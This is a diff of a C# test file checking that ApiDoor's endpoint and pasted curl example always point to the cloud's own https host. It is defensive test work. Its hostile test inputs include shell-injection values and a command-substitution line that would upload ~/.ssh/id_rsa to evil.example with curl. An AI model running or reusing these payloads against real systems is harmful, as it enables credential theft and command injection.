@@ -74,32 +74,59 @@ public class ApiDoorTests
         Assert.Equal("https://cloud.tafs.example/v1/doors/api/door_ord7/requests", endpoint);
         var example = ApiDoor.Example(endpoint);
         Assert.Contains("$TAFS_API_KEY", example);
-        Assert.StartsWith("curl -X POST https://cloud.tafs.example/v1/doors/api/door_ord7/requests", example);
+        // Single-quoted, so the pasted line stays inert whatever the endpoint holds.
+        Assert.StartsWith("curl -X POST 'https://cloud.tafs.example/v1/doors/api/door_ord7/requests' \\\n", example);
     }
 
+    static readonly Uri Cloud = new("https://cloud.tafs.kiff.dev/");
+
     /// <summary>
-    /// The example carries the developer's key, so its address is only ever on tafs cloud's own host, over https (agentgabo's
-    /// note on tafs-linux#88, parity-steward's on #90): anything else becomes its path there.
+    /// kiff/tafs <c>vectors/api-door-endpoint.json</c>'s <c>exact</c> cases, the endpoint every app must show: tafs cloud's own
+    /// host over https with an unreserved path, never a query or fragment, else tafs cloud's address alone. Copied from the vector
+    /// until Windows' pin reaches it; read from <c>shared/vectors</c> then.
     /// </summary>
     [Theory]
-    [InlineData("/v1/doors/api/x/requests", "https://cloud.tafs.example/v1/doors/api/x/requests")]
-    [InlineData("v1/x", "https://cloud.tafs.example/v1/x")]
-    [InlineData("https://cloud.tafs.example/v1/doors/api/x/requests", "https://cloud.tafs.example/v1/doors/api/x/requests")]
-    [InlineData("https://CLOUD.tafs.example/v1/x", "https://cloud.tafs.example/v1/x")]
-    [InlineData("https://evil.example/v1/doors/api/x/requests", "https://cloud.tafs.example/v1/doors/api/x/requests")]
-    [InlineData("http://cloud.tafs.example/v1/x", "https://cloud.tafs.example/v1/x")]
-    [InlineData("https://user@cloud.tafs.example/v1/x", "https://cloud.tafs.example/v1/x")]
-    [InlineData("https://cloud.tafs.example:8443/v1/x", "https://cloud.tafs.example/v1/x")]
-    [InlineData("https://cloud.tafs.example.evil.example/v1/x", "https://cloud.tafs.example/v1/x")]
-    [InlineData("foo:x@evil.example/v1/x", "https://cloud.tafs.example/x@evil.example/v1/x")]
-    [InlineData("mailto:a@evil.example", "https://cloud.tafs.example/")]
-    [InlineData("//evil.example/v1/x", "https://cloud.tafs.example/evil.example/v1/x")]
-    [InlineData("\\\\evil.example\\v1", "https://cloud.tafs.example/v1")]
-    public void The_endpoint_is_only_ever_on_tafs_clouds_own_host(string address, string shown)
+    [InlineData("https://cloud.tafs.kiff.dev/v1/doors/api/door_ord7/requests", "https://cloud.tafs.kiff.dev/v1/doors/api/door_ord7/requests")]
+    [InlineData("/v1/doors/api/door_ord7/requests", "https://cloud.tafs.kiff.dev/v1/doors/api/door_ord7/requests")]
+    [InlineData("v1/x", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("https://CLOUD.tafs.kiff.dev/v1/x", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("https://evil.example/v1/x", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("http://cloud.tafs.kiff.dev/v1/x", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("https://cloud.tafs.kiff.dev:8443/v1/x", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("https://me@cloud.tafs.kiff.dev/v1/x", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("https://cloud.tafs.kiff.dev.evil.example/v1/x", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("https://cloud.tafs.kiff.dev/v1/x?a=1&b=2", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("https://cloud.tafs.kiff.dev/v1/x#frag", "https://cloud.tafs.kiff.dev/v1/x")]
+    [InlineData("https://cloud.tafs.kiff.dev/v1/x$(id)", "https://cloud.tafs.kiff.dev/")]
+    [InlineData("https://cloud.tafs.kiff.dev/v1/x;id", "https://cloud.tafs.kiff.dev/")]
+    [InlineData("https://cloud.tafs.kiff.dev/v1/x&id", "https://cloud.tafs.kiff.dev/")]
+    [InlineData("https://cloud.tafs.kiff.dev/v1/x'id'", "https://cloud.tafs.kiff.dev/")]
+    [InlineData("/v1/x$IFS!*+,=", "https://cloud.tafs.kiff.dev/")]
+    [InlineData("/v1/x%20y", "https://cloud.tafs.kiff.dev/")]
+    public void The_endpoint_is_the_vectors_exact(string address, string shown) =>
+        Assert.Equal(shown, ApiDoor.Endpoint(Pinned() with { Address = address }, Cloud));
+
+    /// <summary>The vector's <c>hostile</c> addresses: whatever endpoint each gives, it keeps the rules, and its example stays inert.</summary>
+    [Theory]
+    [InlineData("https://cloud.tafs.kiff.dev/v1/x`id`")]
+    [InlineData("/v1/x$(curl$IFS-T$IFS~/.ssh/id_rsa$IFS-k$IFS'https://evil.example')")]
+    [InlineData("foo:x@evil.example/v1/x")]
+    [InlineData("mailto:a@evil.example")]
+    [InlineData("@evil.example/x")]
+    [InlineData("//evil.example/v1/x")]
+    [InlineData("\\\\evil.example\\x")]
+    [InlineData("https://evil.example@cloud.tafs.kiff.dev.evil.example/")]
+    [InlineData(" https://cloud.tafs.kiff.dev/v1/x ")]
+    [InlineData("https://cloud.tafs.kiff.dev/v1/x\n;id")]
+    [InlineData("javascript:alert(1)")]
+    [InlineData("")]
+    public void A_hostile_address_keeps_the_vectors_rules(string address)
     {
-        var endpoint = ApiDoor.Endpoint(Pinned() with { Address = address }, new Uri("https://cloud.tafs.example/"));
-        Assert.Equal("cloud.tafs.example", new Uri(endpoint).Host);
-        Assert.Equal(Uri.UriSchemeHttps, new Uri(endpoint).Scheme);
-        Assert.Equal(shown, endpoint);
+        var endpoint = ApiDoor.Endpoint(Pinned() with { Address = address }, Cloud);
+        Assert.Matches("^https://cloud\\.tafs\\.kiff\\.dev/[A-Za-z0-9/_.~-]*$", endpoint);
+        var shown = new Uri(endpoint);
+        Assert.Equal(("cloud.tafs.kiff.dev", Uri.UriSchemeHttps, true, "", ""), (shown.Host, shown.Scheme, shown.IsDefaultPort, shown.Query, shown.Fragment));
+        Assert.Empty(shown.UserInfo);
+        Assert.DoesNotContain('\'', endpoint);
     }
 }
